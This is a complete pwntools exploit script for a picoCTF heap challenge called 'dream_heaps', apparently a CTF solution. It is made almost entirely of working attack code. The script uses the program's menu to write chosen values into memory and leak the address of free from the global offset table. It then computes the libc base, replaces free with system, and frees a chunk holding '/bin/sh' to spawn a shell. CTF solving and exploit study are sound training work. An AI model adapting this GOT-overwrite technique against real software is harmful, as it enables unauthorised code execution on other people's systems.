#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./dream_heaps", checksec=False)
libc = exe.libc
#libc = ELF("/tmp/libc6_2.35-0ubuntu3.10_i386.so", checksec=False)

warn = lambda x, msg="Test": log.warn(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

def conn():
    if args.REMOTE: 
        return remote("saturn.picoctf.net", 65497)
    else: 
        return process()
p = conn()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x0000000000400B16
        c
        c 21
        x/30xg 0x00000000006020A0-0x20
        b*0x0000000000400A5B
	''')
#input()

def write_dream(lengh, content=""):
    sla(b"> ", b'1')
    sla(b"How long is your dream?\n", str(lengh).encode())
    if content: 
        sa(b"What are the contents of this dream?\n", content.encode())

def edit_dream(index, data=b""):
    sla(b"> ", b'3')
    sla(b"Which dream would you like to change?\n", str(index).encode())
    if data:
        s(data)

def read_dream(index, msg):
    sla(b"> ", b'2')
    sla(b"Which dream would you like to read?\n", str(index).encode())
    return warn(u64(p.recv(6)+b'\0\0'), msg)

def delete_dream(index):
    sla(b"> ", b'4')
    sla(b"Which dream would you like to delete?\n", str(index).encode())


write_dream(1, "1")
write_dream(2, "2")
write_dream(0x000000000060208C, "3")
write_dream(0)
for i in range(4, 9):
    write_dream(i-1, str(i-1))

edit_dream(9)
write_dream(exe.got['free'], "1")
write_dream(0)
write_dream(0x6020f0, "3")
write_dream(0)
write_dream(u32(b"/bin"), "5")
write_dream(u32(b"/sh\0"), "6")
for i in range(6, 8):
    write_dream(i, str(i))

delete_dream(7)
free = read_dream(8, "Free plt leak")
libc.address = warn(free - libc.sym['free'], "Libc base")
edit_dream(8, p64(libc.sym['system'])[0:7])

write_dream(9, str(9))
delete_dream(9)

p.interactive()
